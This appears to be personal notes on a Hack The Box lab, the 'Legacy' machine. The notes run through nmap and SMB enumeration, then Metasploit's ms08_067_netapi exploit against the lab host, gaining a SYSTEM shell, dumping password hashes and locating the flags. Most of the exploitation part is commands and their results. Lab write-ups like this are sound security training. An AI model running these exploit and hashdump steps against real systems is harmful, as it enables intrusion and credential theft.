HTB - 1. Legacy

1. `nmap -A -T4 -p- 10.10.10.4` shows 139 and 445 open, running Windows XP, computer name LEGACY, message_signing disabled.
2. `smbclient -L \\10.10.10.4\\` no connection
3. Metasplot
	```
	sudo msfconsole
	search smb_version
	use auxiliary/scanner/smb/smb_version
	options
	set rhosts 10.10.10.4
	exploit
	```
	Result: running Windows XP SP3
4. Search `smb windows xp sp3 exploit` found https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
5. Metasplot Exploit
	```
	use exploit/windows/smb/ms08_067_netapi
	set rhosts 10.10.10.4
	run
	getuid
	sysinfo
	help
	hashdump
	shell
	``` 
	Result: shell spawned at NT AUTHORITY\SYTEM (root equivalent)
	`hashdump` gives password hashes
	Admin Flag at `C:\Documents and Settings\Administrator\Desktop\root.txt`
	User Flag at `C:\Documents and Settings\john\Desktop\user.txt`